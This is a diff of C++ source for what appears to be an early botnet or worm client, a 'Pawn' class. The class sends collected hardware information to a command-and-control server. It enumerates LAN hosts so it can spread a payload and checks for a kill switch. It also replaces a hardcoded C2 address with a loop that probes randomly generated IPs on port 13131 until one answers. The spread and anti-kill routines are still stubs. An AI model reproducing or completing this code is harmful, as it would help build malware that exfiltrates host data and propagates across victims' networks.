@@ -14,6 +14,7 @@ bool Pawn::sendMySelfData() {
     return mypost(CC, sdc.hwInfo);
 }
 
+
 bool Pawn::checkSWKill() {
     /* TEMPORARY
      * looking for parent
@@ -43,17 +44,19 @@ bool Pawn::checkSWKill() {
 bool Pawn::spread() {
     // iterate through LAN members & send payload
     for (auto i = LAN.begin(); i != LAN.end(); ++i){
-        std::cout << "LAN member is" <<  *i << std::endl;
+        std::cout << "LAN member is " <<  *i << std::endl;
     }
     return true;
 }
 
+
 void Pawn::doWork() {
-    for (int i = 0; i < 20; i++) {
+    for (int i = 0; i < 10; i++) {
         std::cout << i << " step" << std::endl;
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
 }
+
 
 Pawn::Pawn() {
 
@@ -63,7 +66,8 @@ Pawn::Pawn() {
             sdc = SystemDataCollector();
             LAN = discoverLAN();
 
-            connect2CC();
+            std::string maybeCCIP = generateCCIP("106.12.12.12", "255.250.0.0");
+            while (!isRealCC(maybeCCIP)) continue;
 
             std::cout << "trying to conSWKill disabled, I'm alive" << std::endl;
 
@@ -73,16 +77,18 @@ Pawn::Pawn() {
             bool spreadResult = spread();
             doWork();
             std::cout << "gonna to sleep." << std::endl;
-            sleep(10000);
+            sleep(2);
+        } else {
+            // just for right now
+            exit(1);
         }
-
-        // just for right now
-        exit(1);
     }
 
 }
 
+
 Pawn::~Pawn() { }
+
 
 std::vector<std::string> Pawn::discoverLAN() {
     std::vector<std::string> LANs;
@@ -95,37 +101,39 @@ std::vector<std::string> Pawn::discoverLAN() {
     return LANs;
 }
 
-std::string Pawn::getCC(){
-    std::cout << "gen: " << gen.generate() << std::endl;
 
-    return "127.0.0.1:13131";
+std::string Pawn::generateCCIP(std::string lowBound, std::string highBound){
+    // returns a possible CC IP address : port between low and high IP address bounds
+    // if no low/high variables, then low = 0.0.0.0 high = 255.255.255.255
+    std::string CCPort = "13131";
+    std::string CCIP = gen.generateIP(lowBound, highBound);
 
+    return fmt::sprintf("%s:%s", CCIP, CCPort);
 }
 
-void Pawn::connect2CC() {
+
+bool Pawn::isRealCC(std::string possibleCC) {
+    // Check possibleCC is CC
+
     std::map<std::string, std::string> dataQuickCheck;
     dataQuickCheck.insert(std::pair<std::string, std::string>("world", "1111"));
 
     while (true) {
-        std::string possibleCC = getCC();
         std::cout << "check CC : " << possibleCC << " ... " << std::endl;
 
         // some check CC here ... => CCisCC = 1/0
         bool CCisCC = true;
         int checkCCConnect = mypost(possibleCC + "/hello", dataQuickCheck);
 
-        if (CCisCC && (bool)checkCCConnect) {
-            // CC is found
-            // get command && 'sleep'
-            CC = possibleCC;
-            break;
-        }
+        return CCisCC && (bool) checkCCConnect;
     }
 }
+
 
 bool Pawn::sendData2IP() {
     return true;
 }
+
 
 void Pawn::preventKill() {
     // monitor sent signals
